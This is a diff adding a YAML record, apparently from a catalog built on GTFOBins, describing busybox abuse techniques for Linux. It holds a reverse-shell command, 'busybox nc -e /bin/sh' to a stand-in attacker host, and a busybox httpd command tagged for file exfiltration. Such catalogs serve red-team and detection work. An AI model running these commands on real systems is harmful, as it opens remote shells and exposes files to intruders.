@@ -1,0 +1,90 @@
+id: gtfobins/busybox/upload/unprivileged
+type: binary
+platform: linux
+name: busybox
+phases:
+- exfiltration
+capabilities:
+- file-upload
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: busybox httpd -f -p 12345 -h .
+  comment: This serves files in the local folder via an HTTP server.
+references:
+- https://gtfobins.github.io/gtfobins/busybox/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        busybox:
+          comment: BusyBox may contain many utilities, run `busybox --list-full` to check what other binaries
+            are supported.
+          functions:
+            inherit:
+            - code: busybox ash
+              contexts:
+                sudo: null
+                unprivileged: null
+              from: ash
+            - code: busybox cat
+              contexts:
+                sudo: null
+                unprivileged: null
+              from: cat
+            reverse-shell:
+            - code: busybox nc -e /bin/sh attacker.com 12345
+              contexts:
+                sudo: null
+                unprivileged: null
+              listener: tcp-server
+            upload:
+            - code: busybox httpd -f -p 12345 -h .
+              comment: This serves files in the local folder via an HTTP server.
+              contexts:
+                sudo: null
+                unprivileged: null
+              receiver: http-client
+    upstream_url: https://gtfobins.github.io/gtfobins/busybox/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-upload
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: exfiltration
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:ac0ecfb28b3f2000fc15b3b526a32c4f9443979e191a7c5b2a99d4e26ca1816c
